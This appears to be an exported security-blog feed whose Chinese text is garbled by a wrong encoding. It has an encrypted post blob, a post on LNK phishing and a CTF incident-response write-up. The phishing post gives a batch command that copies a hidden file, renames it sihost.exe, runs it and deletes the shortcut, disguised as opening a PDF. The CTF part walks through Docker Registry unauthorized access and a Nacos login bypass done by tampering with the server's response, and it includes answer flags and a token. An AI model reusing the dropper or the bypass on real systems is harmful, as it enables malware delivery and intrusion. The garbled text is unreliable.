f614843c3991b1e7c5ac936e953423798bb05e35680148faca4f421db4437730ea0e53e1e7f3ad60f7642a885808c89b72062355d2d0bc21a6c435139f5ab0b274057f760e689af873f215bed5e5ef6a63e59b9d0f558f0c800579fa506547cbaf41e1e359fc60a3854845e88bd9a09d93b3da8050670e3aa7e468617e954e8f618d900764ee2a0ee5f6de4fd3ad82afe15ad0456502c07fcaba9ce03dcbbdf3ea8935e4326dfc3fe072a012be33a091f13e9e1029f72522c94d74c70ccc6ad05a2f2fb1073c08041c650f3f7804402bca8a017972c381d0a7083871acf6eb9524ace8777758083ec22f27a1836715451aed9da08ed0d02a0cc99c69e98be707533be143e6eac99f3c376d9a4922368995f90a1d89cfaf35e46cf674cd322efda149ffb9c79ae17d9dafa77c34a1737a7eefabcf047f26057491127b1f1e7cf19b2877b1580b01426a24dbc4422c4ddde16cba5476d1503b33e94af71f4b1284c2750c5cfcca10a51498db14fa3084ed1513eee5c6e974da3025c02e6a3a5c5d2aef977851020e5495185c524af3f93e1f5d61664df2181cce72b2e4021e94899fc14be4258a77cbc9d857ed22715a3c0e7fb4d6fed118b9ec037655bd7eb7b415027313ab4ca0e2e4babe61803074a3244767d21295f3b27c8d1461f2cef11220a23d030c3f39abfea04711cb3961756735f2fd431280cfd4d5df4dbbc5b8e6b57b3fae51f44e83f7e4afb6e5a6757fb4084723b20620815dc307cde4fce683590f619b03f1c3c1f9c8da4fb6a7e764221a3c8b6fd299a405242a61646dbb6f45dcadb29cf4821da756727f896e30fc56c79951bfb4847a0bc42cf2a6ab476aaf6af98a209bc668df9110b40a176ced3f987e18c5a18216f422f07b2bb1da36bca15b22f664873f7f654eb9cc0ac5ae3ad45c2d5d601b799b6f5d58ebe9ceace5d97c8f0dff75c5829f171cad9f0114095e94742f3fdaeef1e2c8d518d1da2be0b1cbd11c8f1591d83e44e4494095187a2d5a308a1d1c80503b8ccc2ac3c9296bae7872540dade154aedc26437064630c2a4f2b7a7da0e674dd4ce632b22e049a7f8634f4fe50e2c8db56c59f9a2667f158693b54249b5ba3615918ebbeee1cdcdaccf4cdb3fe2feac684752acaab89a271ee06f6699c64af347b65d453150384b1feef164d6331a5cd8bd08f51d024fc346ffabfc5d1b3aa58b7adfae5a43ef38671d4869c4ae8cbdb271ee56fdc434fe7708e1f14eb8e6ffca6ced3a9b215c42de265da70f7215461f91aa05db842e41a58b5c2fcc789a04cfe746db8904e288442a32157921f96d7e2b69daec4754b291277a09770448019c07828a8b045caf11eebb9d757c1f1fba314767b2c244face3d667fe1acac57e397adffd9ac6d9f0060e15362527d8227b5fb02e9528ce79e049a54a4a72391fffcb977478f3a7ac61368810f0ad870ceaf8940f93a8987bdd1f385df9cd08983b3ff08fc018cc297fd2eea4bbe83ce78aef06551d7bee30259fde1732546dd983f3914219c39e987e05f0e718eea592f60276d3009b91388631d27ccd7e3037536c5fa148020a915d1fcfa635744f7d6def905c3f03e35a8bb4d8785909d3d715e7b8614730927ce6dbc2865a6798915b78fbd3c797fdf26f712f2685c0414bfaca738a5309beb000d68bc1ee10a7265127ae324523c64f7f43880a9d875088226d2f628d55381871eb7cb46cb35263c09327887ad7d41f42edaf3ded02c88df240496b026ed52730510e4f30ba1a353850ed787e1da8c072b4a1bbc1397b79ced15776f8f33e1a663ef9cdea84ebf15ce1c1b67b1171bef4209de302cfc4e53ba29a14fed67bfad6c47968b8414e31177434615142e457dab9dc9861bf08a6ee0240f023beed751908fd96bf921d54d86bdde33b4bededc281241f24c71c71ff374df5fa5250283ca25e1c0ff411562577b9cb28db43481d7e2374fe1ee8b1e76c5dd841374a5b39d1fb9d71a0ab11dfacadbc8caea00e0aadfd603b34c4b8b966972e6997972c673ef7bf3f17b24b37f8174f8508dd3d0b3b187546657c070e23d2e403f5faa149cdf89377373cf764c986e620dc7a8134c0375e61fc165721f7fd177781e98ad9104cd147861f5fd3d2e1b7ac76fb8f02886ad0844201af85ff63368ebe794ccbe59da571fee1fab4e4e263a3d87baed4081f877efb676773b082b73d824536677ac9b4d1e844f32cc4b38d367ee598be1f1969413509e1840f2767ee4a4a94d0bc814223822430d06116fe5090953de5352063a9c206a287b080af5f04078845ec62041f5595ebf07eaa74526fd973e0bb3ed28b17cdcc73d73b9efad1f0d828dab70d403fd77a5b73c617c497e515b1500d1500eead9b718ec28b5441c7c09faf7a986eed7d7b95e846d4c81b45f3ae867e05e569874990ab43abe13614e51808638cb859bfec20c3b15994e76fc208172ddf35cab06ac26785901bc25fe6d6feaf5cd24f6ebd5689f7510675bbf082c15421d5a3dbd0f476d674600fa8aa47c193734e3a0b0dbbcc47526e2f3cefb15643d73acb3a08cefc23a4ee866b11375290e1facd1f46ef855117fa1113a31b4ff4d60213e9659c954fe3732f08f055e47660f70d548bd9ba8f4d0b1072385e800e0277ac70a055eef939655b35caf063b8af1abf9999a68dee8236c15bf1e083dbb526abad84d36c486625195d662924615492e0b11a141d8be2527557b31ee9c64fb1de8f2c861776e1b39d3cd864e7608402d394b64fdf4c7d2f084353d63206eead45ca7b12f1a127a245c999390220d5608272d3f3c53ce5d2954f95bccd95e6bd6a92167962b70dcfae979af5b031666d3fe79c4b52766d0a51e0e730a6840bcf3b0b1d9cd64a4b4f7cf20734371678f06b5ac8c5ad5975ac8e3bc55b071e7db16d2f3f73582133603ef5ad44776f2d41160b6f1a5f6271eb6cfa589bce7b82ac31aee87c51cea6f191492a71b050582923b291a2ec088dd4513c90d55d2bb38000c5273bf695be7d4438ec4e3da42661d34a719ee9d5dd0cea46e54fff4f025e5f9bc1015dc480bf38296c4305404eea9473721754f10c7ec650914a55af60d46a655c09d222985c3ec6acecac2988ca569f4acb21775235f8dbf0821978650f4bbd4817e362f94c98497afae49dbdccf90ffabb3d7a232d8ee17cf867246f9dab41f6ef54ae63c5d3de2dd0834565bf9ad7c04e7545b6535daac6828dafd742a945d9deb25467cd0b09ee34b1d7d3bc03ea30cfa4db1c39759508f169c0bf84f58299f6e3f0c120b97660b9de5de2844fcd4ec77fe15a1dfdfa96d33414424aebc326f061c4b39b60e59a0a416c749e28c961af0c2786aeb8b1cc358a2c9af7e624d0534485fff79d2d4d443a0ca8330eea28653f902d11ce51fc7947c94c264c6dd1d9e0b855f3dc6261a57ec0f3dc8283e918f59dbe578a44785aa24089c1ee52cb2b6d916beeb4ec285d6842d785e96d45f6eaf921d83a329649f98d0a2dfe851c1e30bc12c47213afbd026407b2541155f99159ae6fa57dc499df6681bf129f093ee6e27e26f8a02cc68e41ef0dcd7ad82359a0409a503b87e82e3cf1863e766b3a9576d4cfd66b79cb97d566fed02d037ab5f511256e097b7c469092e385444aabaed613a18548ac5383255b6fe3dde3a73f9d5fced8919403b3790af5a823343a0e5cfa3cab80774aa38b5d1d9fcf0dafa1645536ee4b37e276f4ba847860af7690fb1e530f7bd534a963aff9e3e2a2dabf0759b84289a6a351722e4a5681ef706fec0dd5f7394aebc267f5aecbeea73e8c2b83530c7fdb041663f62e7108e74b202c05423cc64abbc544b531ac18353c916c660e15537cdb928e1deee40d3a33c9719024cb6dff45868a3a411bebc5b2ced64822732c063f730d956a3a0981dc25cc7af0d5c3f8ff7366d2bd8487b560e2ec3dfef9cc4f7304b0d0b54be56a03dd430eff2d6c47fcf09659eb4702cbf0d6ad1e6ac1ef9b12213e663492cfbdd35831ce60bb4bd21806283c83b416e67b5324c6756d07d7e4f988b1a69e30fd840c81a88eaa91e4e9968e6f4dea49a8a1e2cd0c26dcde02fb4a089a6e5354fde8606b925cdc7ac5917338e320d6654a2da5991a5cea73ba2a3a0a16dbab184b20c73d8603de766a8ab8196a4e900f76900ecabbd1650beea5b70a9908a48e7c5dd6cf1513a3fff3aa20eced1c329149edac491ae24655c558b2f660899c380117adc4b3c895f1e33e01946f01642258a0e5c99f9d393b93bdc85e5ecceaa866583d504c49ea70e83c6ac00605beaa85d374b2bb9d818a9beb596d9e2ab138e8ea0be2d223d02b04c8a7cd6458fe10fee7d070c7c51d58e1f2bdefaa727efbb4ec97cd37cc8bfadb231998ddbe585396959f55635ecc77dcd99add2b9bad0151851a06197a2031c4e160de3401fcbaa2db4f3efd2b803da6f70657aaecdc73676dcd69bc17afc60ed5de3bf0c1e234fc0b7663e94049b1eaaddcc3fe2c23c908648d7a0def6105d08a240117618361794164908d84ec3699ec6bc10ec36a01c8f63af0fe421289d8e9c2b9af8e4e6f436843080bf86a014dadacb3d7d3df805dbd8e763da6b09fb92b9a523a1ec3d76f2b8ffaea13849afcb18793e1a76979c6bb820f81a4223a4740811e6bed9af79dc3650516b654bb8caff354cadcf3d61e8a3a04bea0613c9b379a93f103019f3b5a0195099d7cdc75422bcdb195e65abc76456de3f1cae5eb6e7e2a38e114dab01d3a129330836494fca030a9bc1d8bb27ca963e8e05d205d24224ac214dde763411d089df9e76503e8ddb147603c7c4b19c914e9c528b261a68fdfd746c8e32a71aa0af3f6e9cfaf5d58e49d8924d6b8185f1e316fb9a5033a60110ee70aa2b04ff0e160d0888c50f02a99da4e68b0d1f3a3d5dd51fba476b0100d851dd24a89192887496495a974434b90a6779de73472d21393f302dace36cc02287c3bf0921e337ffebaeb5bf5adfc2bd2daca911ca7c69294b8f80831d1d8304056f12ad99b629f1631d50ef7fa16ee1b2642ac43ac40ad7c551b4c03f843a1f7c8d27e28fd18d10ef7755af4b8a306a0a4f0339a79c610ecb7d217fe2ca72a4dd627f8a08b2e0c929c42279adadfd940cc34632d4a994847b1a0c9d5e3b8fecc61b19099a251705bd278a79e3a795d499f1fb1340fe2085a1a1b86c8137314d4c1c3809d7d679ae70de7d9bd8e044c278f3a73b3ba157ba8dc379c800aedb1c368648ba7d582eb87c05a539475e7608b870e6d75da8ade40c4b99e2dd042d2a0df56396f104b165d84166fc6a5b997c5d2e8f6d6795f26760a990278f7d18971370915efb0b12449040c79dc99523fe651c7ad28ba8704eeba1501d6044e958262bb5ff321d95f576bc4ba6d80c0127a9df4caef226161a0962ddb10a768d75858181c5c3498a56be66a9868af461259700bcaaa5c95cea1afc9dc0f0cf26e343f07d6876821f0607bd9f37c25062b7fc044e7868358b5b8428b98f97923411b2f86584f7023bfcf3361ab710c41915a943010029fa850e3cd2452d2c8d483f9cff73aa6411f9c933eb8d67045fc6a42d62306dbea4a993a8081b8c70e9de615079ca5081092ddfa47f6eeeba47a95043da83412726e34621ad96c56a288b9cfc60021cee5206ece29ca8f3ed1d4883e3e8c250dc7344a776b187f9732222b8ab8caeba9bcc9874b01d202d5e646885cef51f78d2b270e46495d29daf15e9e112ccdc22bcb20e213a827b23ba0769b44e58e5ea32783d1b40a8b8d1d9265642f674403319b55ac62288049c2b2d874ebffd206a0f3c35650b49afaed0dc1c5032f1552d213642c76720e41e16717c8f975fbe96fbdd9dc28a0b4399f97ec2c52e371cd25e3af614b0b83e3440ff405fed7a420446a4ee5046e70cdd0b525f6a560c82b4c4163a9bdfe73c82c8a6ad1aa9a4cd9172e9c234abfa49fc43f4e667476027a717a03a8db6b5b8b937b0351c932714ee28c9f0474cf01437f32c600e93a9e9af6017fde37b4e926180165cf28120a54d06a20c62d6e08612ebf1d28d14df6ed5a0db351c31ccdcaf5dea5f9471f85e25981e96db02f8ed60b0944e429871de3bdbf7900e8b60b45fed6eedd420c2630ed3d9fbdc589349257fbf94ac618376e351ee16474d19495115570f9a1ddb448f5bccedfab3e3421a984a362d5aded53679968c4d1443fe03471afefc34b14a78ed51967e8fc4f54f54832c9a8107033a5d4bbffba408d486d6fa5e4e47a86269ead4a31bf854c20cdb97b8b8737ece08dd56dc7e411bd010958e388d4db3584b89e629a798eb03a4d6c8dca36e55cd6c567567dd2d68d51849e487cc8bec50c2c4ec7bc2eeda97637ff104d2df6216a3a20be9c2897ba45f47f64a7bb8db8d38eccea76a763f89887f3abb1e8289549df26199aa1e50e9f7f8fc3cbcaa1d8a9fceda3c6f557c29540c7d8faa61d0d5cc8e3e6cd76adf031048a85dc73f169241b734c059e021cf06d1c7f0df1645b48f6968767ba30e9e67601f8f92d0158878a8649e4100dcfffd8a3e1fc45d1f3642a7cbb18a88e3f484b181ba2cf740c75bc7188af75e2dea6cd145a0bff74373e47929a533f02ce09e509595529fbc040ac1320146133e9036ca4b3176d4e82b3977ca0876cda5b9182486f3b3e309e0f93409bfc9b1c8b902db37ce9d0408a7d21f5300870a88a72c341d8b258735bcf1aeb3843ccb43ff3255c52bc686ccfcfbcb31bbb69508b0cabbc6c547ad4afaf1db8e5fdfff8172f1a02205ed78005ec79c47a511041de8b3bcb2edb9d042ba90729b74bf67ce09b611ca277569df485845f49f8087b607ad4a400084f930afc0ef996aca78a43f4220f9e2d32ac53852a903e501001e22596fae1456ce59706d94d948b6c3135c42cfce1525176e7bf72fee30f43f0cd0a3410d04ba2910910237b38ef906421d0f15ab99dd597733676d784f5141b4dccc26af2b1cc922d95529f88eb34996ef0cffb897cae8fe9230ba2f25d40a7f6be97395f3cd1803fe1bdc430e17737460d94ccf6b4c18aa5554f0d71a39e206d2ddcb677cf2d8ee9dbfe0313a9bc2f6aee4dc532e44199d2e28f2c5994eb2dcf7882aeffa4434ef04462ac69844fd54c6042ac36998c5a40911e8ada5feeb0dd3f773f83fe15076112572e8ef768b2d7ddff1b4de49e571f7a70297cde40bb0717cee07250bbfd241829dcc92c3d2cfc5667bb04acde2206027634c9cb392091bcaf343eb2363e20d9b4e76b3c5096c7cf3d4d8882a9558e64dcc710ebc82c02fcca222318d5c265fe65246bc9f99f0df473bef862f14ecaedfc95bb3374c3d3e861ec65a10b23d4054c6b9bbe262b0dc613803417d26be12f14f9815513efd2289cf66af13e4603c5a242ffc7a494512c997e9aff67c7550443ab1f3ea7bbd26a838544b9ed4bfeccb1a0601897e93696d0cf79c1650cda5698ee5f832d86f80d67970abc013404ad020ef24420c55e76d74d43cb037212590080428339de74da79f14c65e89596a226b05118</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>lnké’“é±¼æ€è·¯</title>
    <url>/posts/bccc3789/</url>
    <content><![CDATA[<h3 id="1-å¿«æ·æ–¹å¼ç”Ÿæˆ"><a href="#1-å¿«æ·æ–¹å¼ç”Ÿæˆ" class="headerlink" title="1.å¿«æ·æ–¹å¼ç”Ÿæˆ"></a>1.å¿«æ·æ–¹å¼ç”Ÿæˆ</h3><p>å‚è€ƒ <a href="http://www.x86matthew.com/">www.x86matthew.com</a> çš„é¡¹ç›®ï¼ŒåŸæ–‡é“¾æ¥å·²åˆ é™¤ã€‚<br>2023å¹´7æœˆä»½æ”¹çš„ä»£ç ï¼Œä¸»è¦é…åˆbat/vbsè„šæœ¬è°ƒç”¨ï¼Œå›¾æ ‡æ›¿æ¢é€šè¿‡010editorè¿›è¡Œä¿®æ”¹ï¼Œä¹‹å‰æœ¬æƒ³å°†å…¶å†™æˆä¸ª æ“ä½œå‹å¥½çš„å·¥å…·ï¼Œä½†ç”±äºéƒ¨åˆ†åŸå› æ²¡å¼„æˆ.</p>
<p>testå¤„å¯ä¼ªè£…æˆæ­£å¸¸æ‰“å¼€pdfæ—¶æ˜¾ç¤ºçš„å†…å®¹ï¼ˆç±»å‹ã€å¤§å°ã€ä¿®æ”¹æ—¥æœŸï¼‰</p>
<h3 id="2-å›¾æ ‡å¤„ç†"><a href="#2-å›¾æ ‡å¤„ç†" class="headerlink" title="2.å›¾æ ‡å¤„ç†"></a>2.å›¾æ ‡å¤„ç†</h3><p>å‚è€ƒ <a href="https://www.cnblogs.com/f-carey/p/16542156.html#tid-sywapk">https://www.cnblogs.com/f-carey/p/16542156.html#tid-sywapk</a><br><a href="1.png"></a></p>
<h3 id="3-batè„šæœ¬"><a href="#3-batè„šæœ¬" class="headerlink" title="3.batè„šæœ¬"></a>3.batè„šæœ¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xcopy /h /y %<span class="built_in">cd</span>%__MACOSX.DOCX\calc.tmp %temp%\ &amp; attrib -s -a -h %temp%\calc.tmp &amp; rename %temp%\calc.tmp sihost.exe &amp; attrib -s -a -h %<span class="built_in">cd</span>%__MACOSX.DOCX\calc.tmp &amp; start %temp%\sihost.exe &amp; del <span class="string">&quot;calc.pdf.lnk&quot;</span>  &amp;  del /F /A /Q %<span class="built_in">cd</span>%__MACOSX.DOCX\calc.tmp</span><br></pre></td></tr></table></figure>

<h3 id="4-æ–‡ä»¶å¤¹éšè—"><a href="#4-æ–‡ä»¶å¤¹éšè—" class="headerlink" title="4.æ–‡ä»¶å¤¹éšè—"></a>4.æ–‡ä»¶å¤¹éšè—</h3><p>æ‰“å¼€éšè—åæ•ˆæœå¦‚ä¸‹ï¼Œæ­£å¸¸æƒ…å†µé»˜è®¤éšè— .__MACOSX æ–‡ä»¶å¤¹</p>
<p><a href="2.png"></a></p>
<h3 id="æ³¨æ„ï¼ï¼ï¼"><a href="#æ³¨æ„ï¼ï¼ï¼" class="headerlink" title="æ³¨æ„ï¼ï¼ï¼"></a>æ³¨æ„ï¼ï¼ï¼</h3><p>2023å¹´æ—¶å€™ç”¨çš„æ–¹æ³•ï¼Œä»…ä½œä¸ºä¸€ç§é’“é±¼æ€è·¯è¿›è¡Œå‚è€ƒå­¦ä¹ ï¼Œåˆ‡å‹¿è¢«æ¶æ„ä½¿ç”¨ï¼ï¼ï¼</p>
<p>å‚è€ƒä»£ç ï¼š <a href="https://github.com/Mamor5409/LnkGen/blob/main/lnkgen.c">https://github.com/Mamor5409/LnkGen/blob/main/lnkgen.c</a> <br></p>
<p>ã€23å¹´æ—¶å€™å­¦ä¹ æ—¶å€™ç¨å¾®æ”¹äº†ä¸‹ï¼Œä½†æ˜¯å½“æ—¶ç”±äºç¼–ç é—®é¢˜æ¯”è¾ƒéº»çƒ¦ï¼Œå°±æ²¡å†è€ƒè™‘æ”¹æˆGUIçš„ æ•´ä½“æ€è·¯æ˜¯è¿™æ ·çš„ ä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ï¼Œåæœè‡ªè¡Œæ‰¿æ‹…ã€‘</p>
]]></content>
  </entry>
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”-ç¬¬ä¹ç« -blueteam çš„å°å¿ƒæ€2</title>
    <url>/posts/b8335347/</url>
    <content><![CDATA[<p>åšäº†åŠå¤©å¤š æ°´å¹³æœ‰é™ ä¿®å¤ç±»çš„ ä¸ä¼šä¿®å¤  å¯åªçœ‹å‰5ä¸ªå¸¦flagçš„WP</p>
<h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>ssh ç«¯å£ 2222</p>
<ol>
<li>nacos çš„ key ä¸ºå¤šå°‘ flag{base64decodekey}   flag{xjnacos2023penguinedisecflagflagflag}</li>
<li>nacosé…ç½®æ–‡ä»¶çš„ flag  flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}</li>
<li>File Management Systemçš„ flag    flag{d6c578d4a41a141d731fe7c36c8c0f77}</li>
<li>root å¯†ç å¤šå°‘ flag{password}  flag{imArGcj9}</li>
<li>é»‘å®¢ç•™ä¸‹çš„ backdoor åé—¨çš„ç»å¯¹è·¯å¾„  flag{/etc/systemd/system/evilfms.service}</li>
<li>ä¿®å¤ 4000-6000 ç«¯å£æ¼æ´</li>
<li>ä¿®å¤File Management Systemæ¼æ´</li>
<li>æ¸…ç†é»‘å®¢ç•™ä¸‹çš„backdoor</li>
</ol>
<h3 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h3><p>è¿™ä¸ªé¢˜éœ€è¦å…ˆæ¸—é€ ååº”æ€¥</p>
<p>æ‰«æå™¨æ‰«ä¸‹IP å‘ç°å­˜åœ¨3ä¸ªWEBæœåŠ¡  5000(æœªçŸ¥)ã€8082(FMS)ã€8848(Nacos)</p>
<p><img src="/posts/b8335347/image-20240607150424444.png" alt="image-20240607150424444"></p>
<p><img src="/posts/b8335347/image-20240607150412632.png" alt="image-20240607150412632"></p>
<h4 id="1-nacos-çš„-key-ä¸ºå¤šå°‘-flag-base64decodekey"><a href="#1-nacos-çš„-key-ä¸ºå¤šå°‘-flag-base64decodekey" class="headerlink" title="1. nacos çš„ key ä¸ºå¤šå°‘ flag{base64decodekey}."></a>1. nacos çš„ key ä¸ºå¤šå°‘ flag{base64decodekey}.</h4><p><a href="http://43.192.63.251:5000/">http://43.192.63.251:5000/</a> è®¿é—®ä¸ºç©ºç™½é¡µé¢  dirsearchæ‰«ä¸‹ç›®å½•</p>
<p><img src="/posts/b8335347/image-20240607150459841.png" alt="image-20240607150459841"></p>
<p><img src="/posts/b8335347/image-20240607150553591.png" alt="image-20240607150553591"> </p>
<p>æ ¹æ®ç‰¹å¾ç½‘ä¸Šå‘ç°ä¸ºDocker Registry APIæœªæˆæƒè®¿é—®æ¼æ´.</p>
<blockquote>
<p>Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚å­˜åœ¨é—®é¢˜çš„ç‰ˆæœ¬åˆ†åˆ«ä¸º 1.3 å’Œ 1.6å› ä¸ºæƒé™æ§åˆ¶ç­‰é—®é¢˜å¯¼è‡´å¯ä»¥é€šè¿‡ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»º containerï¼Œåˆ é™¤å·²æœ‰ containerï¼Œç”šè‡³æ˜¯è·å–å®¿ä¸»æœºçš„ shellã€‚</p>
</blockquote>
<p>è·å–æŒ‡å®šä»“åº“ä¸­é•œåƒçš„tagåˆ—è¡¨</p>
<p><img src="/posts/b8335347/image-20240607150614083.png" alt="image-20240607150614083"></p>
<p>åˆ©ç”¨å·¥å…·ä¸‹è½½å®¹å™¨  <a href="https://github.com/NotSoSecure/docker_fetch/">https://github.com/NotSoSecure/docker_fetch/</a></p>
<p>python docker_image_fetch.py -u  <a href="http://43.192.63.251:5000/">http://43.192.63.251:5000</a> </p>
<p><img src="/posts/b8335347/image-20240607150632918.png" alt="image-20240607150632918"></p>
<p>ä¸‹è½½å å°† .tar.gz æ–‡ä»¶ è§£å‹å¯çœ‹åˆ°ç›®å½•ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in *.tar.gz; do tar -xzvf $i; done</span><br></pre></td></tr></table></figure>

<p>è§£å‹åå¦‚ä¸‹</p>
<p><img src="/posts/b8335347/image-20240607150645891.png" alt="image-20240607150645891"></p>
<p>ç¿»æ–‡ä»¶ æŸ¥æ‰¾nacosæ•æ„Ÿæ–‡ä»¶  find . -name conf </p>
<p><img src="/posts/b8335347/image-20240607150720121.png" alt="image-20240607150720121"></p>
<p>åœ¨homeç›®å½•ä¸‹å‘ç° nacos åœ¨  applicantion.propertiesä¸­æ‰¾åˆ°key </p>
<p><img src="/posts/b8335347/image-20240607150802463.png" alt="image-20240607150802463"></p>
<p><img src="/posts/b8335347/image-20240607150848515.png" alt="image-20240607150848515"></p>
<p>è§£å¯†å¾—åˆ° flag{xjnacos2023penguinedisecflagflagflag}</p>
<h4 id="2-nacosé…ç½®æ–‡ä»¶çš„-flag"><a href="#2-nacosé…ç½®æ–‡ä»¶çš„-flag" class="headerlink" title="2. nacosé…ç½®æ–‡ä»¶çš„ flag"></a>2. nacosé…ç½®æ–‡ä»¶çš„ flag</h4><p>åœ¨nacosçš„ confç›®å½•ä¸‹ å‘ç°æ•°æ®åº“å¯†ç  å¥ˆä½•æ— æ³•è§£å¯† æ— æ³•åˆ©ç”¨</p>
<p><img src="/posts/b8335347/image-20240607150958932.png" alt="image-20240607150958932"></p>
<p>å»æ‹‰ä¸‹ç§æœ‰ä»“åº“</p>
<p><img src="/posts/b8335347/image-20240607151020319.png" alt="image-20240607151020319"></p>
<p>è¯•äº†å¥½å‡ ç§æ–¹æ³• æœ€ç»ˆè§£å†³æ–¹æ¡ˆå‚è€ƒ <a href="https://www.cnblogs.com/programmer-tlh/p/10996443.html">https://www.cnblogs.com/programmer-tlh/p/10996443.html</a></p>
<p><img src="/posts/b8335347/image-20240607151037999.png" alt="image-20240607151037999"></p>
<p>å¯åŠ¨docker è¿›å…¥å®¹å™¨</p>
<p><img src="/posts/b8335347/image-20240607151059502.png" alt="image-20240607151059502"></p>
<p><del>å¥½åƒæ²¡å•¥ç”¨</del>  æ¥ç€åœ¨ç½‘ä¸Šæ‰¾nacosç›¸å…³æ¼æ´ï¼Œåœ¨githubå‘ç°äº†è¿™ä¸ª  nacos Default token</p>
<p><img src="/posts/b8335347/image-20240607151139077.png" alt="image-20240607151139077"></p>
<p>é‚£ä¹ˆ å¦‚æœåœ¨æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªnacos ç„¶åå°†é…ç½®æ–‡ä»¶æ”¹ä¸ºå’Œ å®¹å™¨ç›¸åŒçš„ç¯å¢ƒ ï¼Œ é€šè¿‡é»˜è®¤è´¦å·ç™»å½•è·å–åˆ° accesstokenã€‚</p>
<p>å¯ä¸å¯ä»¥ç”¨è¿™ä¸ª AccessTokenå»ç™»å½•åˆ°é¶æœºçš„åå°ä¸­å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>ç¿»åˆ°è¿™ç¯‡æ–‡ç«  <a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a>  æ–‡ç« æåˆ°å¯ä»¥å»ä¿®æ”¹ç™»å½•åçš„å“åº”åŒ… </p>
<p>äºæ˜¯æƒ³åœ¨æœ¬åœ°dockerä¸­è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æŒ‰æ–‡ç« çš„æ€è·¯å»è·å–AccessToken ç„¶ååœ¨é¶æœºä¸Šåˆ©ç”¨ã€å› ä¸ºéƒ½æ˜¯åˆ©ç”¨çš„åŒä¸€ä¸ªé¶æœºï¼Œä»–ä»¬çš„nacosé…ç½®æ–‡ä»¶(key)éƒ½æ˜¯åŒä¸€ä¸ªã€‚ã€‘</p>
<p>åœ¨æœ¬åœ°dockerç™»å½• ä½†æ˜¯ç”±äºä¸çŸ¥é“è´¦å·å¯†ç  æ— æ³•ç›´æ¥ç™»å½•ã€‚</p>
<p>ç„¶ååœ¨dockerä¸­çš„nacosä¸­è¿›è¡Œé…ç½®å…³é—­é‰´æƒ</p>
<p><img src="/posts/b8335347/image-20240607151458400.png" alt="image-20240607151458400"></p>
<p>å…³é—­åå‘ç°æ²¡æœ‰ä»»ä½•æœ‰æ•ˆæ•°æ®å¯ä»¥åˆ©ç”¨ï¼Œç„¶ååˆåœ¨ applicantion. ä¸­æ¢å¤äº†é‰´æƒã€‚æ¢å¤é‰´æƒånacosçš„å¯†ç å°†ä¼šè¢«é‡ç½®ä¸ºnacosï¼Œå› æ­¤æˆåŠŸç™»å½•åˆ°äº†nacosçš„åå°ã€‚</p>
<p><img src="/posts/b8335347/image-20240607151704577.png" alt="image-20240607151704577"></p>
<p>F12 æ‹¿åˆ° accessToken</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxNzc0MTkyNn0.3j_90EB5peq10xsqMYSwapYDEKa3iCujD7o19hmTaek&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true,&quot;username&quot;:&quot;nacos&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b8335347/image-20240607151727920.png" alt="image-20240607151727920"></p>
<p>åœ¨nacosä¸­è¿›è¡Œç™»å½•æ—¶ï¼Œå¦‚æœè´¦å·å¯†ç ä¸æ­£ç¡® å°†ä¼šè¿”å›403</p>
<p><img src="/posts/b8335347/image-20240607151833009.png" alt="image-20240607151833009"></p>
<p>å›åˆ°äº’è”ç½‘ä¸Šçš„é¶æœºnacos ,å‚è€ƒ<a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a> çš„æ‹¦æˆªè¿”å›åŒ…ï¼Œæˆ‘ä»¬æ‹¦æˆªåè¿›è¡Œä¿®æ”¹ï¼Œ</p>
<p><img src="/posts/b8335347/image-20240607152144161.png" alt="image-20240607152144161"></p>
<p>å°†403æ”¹æˆ200 ç„¶åå°† è¿”å›å†…å®¹è®¾ç½®ä¸º acessToken </p>
<p><img src="/posts/b8335347/image-20240607152011644.png" alt="image-20240607152011644"></p>
<p><img src="/posts/b8335347/image-20240607152029700.png" alt="image-20240607152029700"></p>
<p>ç„¶åæ”¾åŒ… æˆåŠŸç™»å½•åˆ°nacosçš„åå°</p>
<p><img src="/posts/b8335347/image-20240607152107469.png" alt="image-20240607152107469"></p>
<p>åœ¨ADMIN_CONFIGä¸­æ‰¾åˆ°flag åŠ file-managerpassword</p>
<p><img src="/posts/b8335347/image-20240607152223432.png" alt="image-20240607152223432"></p>
<p>flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}</p>
<p>file-managerpassword</p>
